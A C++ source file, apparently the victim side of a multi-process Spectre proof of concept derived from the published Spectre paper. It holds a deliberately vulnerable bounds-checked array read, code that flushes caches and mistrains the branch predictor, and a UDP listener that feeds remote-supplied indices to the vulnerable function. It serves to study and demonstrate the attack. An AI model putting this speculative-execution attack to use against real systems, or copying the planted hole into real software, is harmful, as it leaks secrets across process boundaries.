/*********************************************************************
*
* Multi-process Spectre PoC
*
* This source code is a derivative of the example code provided in the
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Modifications have been made by Luke McHale to demonstrate Spectre
* across seperate victim and attacker processes.
*
**********************************************************************/

// C++ Includes:
#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <chrono>

// C Includes:
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif

// Local Includes:
#include "udp-socket.h"
#include "defines.h"


/********************************************************************
Victim globals.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char secret[4096];       // contiguous, nearby secret in static-globals section
std::string secret_heap; // contiguous, secret's data exists on heap
//const char *secret = "Replace me with a run-time secret...";


/********************************************************************
Vulnerable victim function.
********************************************************************/
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}


/********************************************************************
Helper/Initialization functions.
********************************************************************/
//template <typename T>
//void print_va(T const* t) {
//  printf("secret (%d bytes) at VA: 0x%lX\n", sizeof(t), (size_t)t);
//}

void update_secret(const std::string& s) {
  if (s.size() < sizeof(secret)) {
    // Update static-global secret:
    std::memcpy(secret, s.c_str(), sizeof(secret));
    printf("secret (%ld bytes) at VA: 0x%lX\n", sizeof(secret), (size_t)secret);

    int64_t malicious_x = (int64_t)(secret - (char *)array1);
    std::cout << "- byte offset relative to array1: " << malicious_x << '\n';
  }

  // Update heap' secret:
  secret_heap = std::move(s); // move constructs, so only exists in one place in heap.
  printf("secret_heap (%ld bytes) at VA: 0x%lX\n", s.size(), (size_t)secret_heap.c_str());

  int64_t malicious_x = (int64_t)(secret_heap.c_str() - (char *)array1);
  std::cout << "- byte offset relative to array1: " << malicious_x << '\n';
}

void init_pages() {
  for (auto i = 0; i < sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 to initialize pages */
  }
}

void print_config() {
  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    std::cout << "Version: commit " GIT_COMMIT_HASH "\n";
  #endif

  /* Print build configuration */
  std::cout << "Build: ";
  #ifndef NORDTSCP
    std::cout << "RDTSCP_SUPPORTED ";
  #else
    std::cout << "RDTSCP_NOT_SUPPORTED ";
  #endif
  #ifndef NOMFENCE
    std::cout << "MFENCE_SUPPORTED ";
  #else
    std::cout << "MFENCE_NOT_SUPPORTED ";
  #endif
  #ifndef NOCLFLUSH
    std::cout << "CLFLUSH_SUPPORTED ";
  #else
    std::cout << "CLFLUSH_NOT_SUPPORTED ";
  #endif
  std::cout << std::endl;

  /* Print information about vulnerable items */
  printf("array1 (%ld bytes) at VA: 0x%lX\n", sizeof(array1), (size_t)array1);
  printf("array2 (%ld bytes) at VA: 0x%lX\n", sizeof(array2), (size_t)array2);
}


/********************************************************************
UDP socket functions.
********************************************************************/
void helper(size_t malicious_x) {
  size_t training_x, x;

#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (int i = 0; i < 256; i++)
      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (int j = 0; j < 16; j++)
      for (int i = 0; i < 256; i++)
        flush_memory_sse( &array2[i*512] );
#endif

///    training_x = tries % array1_size;
    training_x = 0;
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    for (int j = 29; j >= 0; j--) {
#ifndef NOCLFLUSH
      _mm_clflush( &array1_size );
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */
      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      }
#endif

      /* Delay (can also mfence) */
#ifndef NOMFENCE
      _mm_mfence();
#else
      for (volatile int z = 0; z < 100; z++) {}
#endif

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim function! */
      victim_function(x);
    }

    // have attacker measure cache state...
}


void recv_worker(uint16_t port = 7777) {
  uint8_t buf[2048];

  SocketUDP s;
  s.open(port);

  std::cout << "["<<port<<"] - Receive worker thread listening." << std::endl;

  for (;;) {
    auto bytes = s.recv(buf, sizeof(buf));
    if (bytes == sizeof(msg)) {
      msg* m = (msg*)buf;
      auto x = m->x;

      std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
      std::cout << "x=" << x << std::endl;
      victim_function(x);
    }
    else {
      std::cout << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
      return;
    }
  }
}


/********************************************************************
Main.
*********************************************************************
*  Command line arguments:
*  1: UDP Port (int)
*/
int main(int argc, const char *argv[]) {
  // Initialization:
  init_pages();
  print_config();

  /* Parse the listen port from the first command line argument.
     (OPTIONAL) */
  int port = 7777;
  if (argc >= 2) {
    port = atoi(argv[1]);
    if ( !(port > 0 && port < (1<<16)-1) ) {
      std::cerr << "Overriding command line argument for port." << std::endl;
      port = 7777;
    }
//    sscanf(argv[1], "%d", &cache_hit_threshold);
  }

  // Setup receive thread to imitate server:
  std::thread t(recv_worker, port);
  std::this_thread::sleep_for(std::chrono::seconds(1));

  // Loop forever, allowing user to enter new secrets:
  for (;;) {
    std::string buf;
    std::cout << "Please enter secret string:" << std::endl;
    std::getline(std::cin, buf);

    if (buf.length() > 0) {
      update_secret(buf.c_str()); // buf now empty..
    }
  }

  return EXIT_SUCCESS;
}
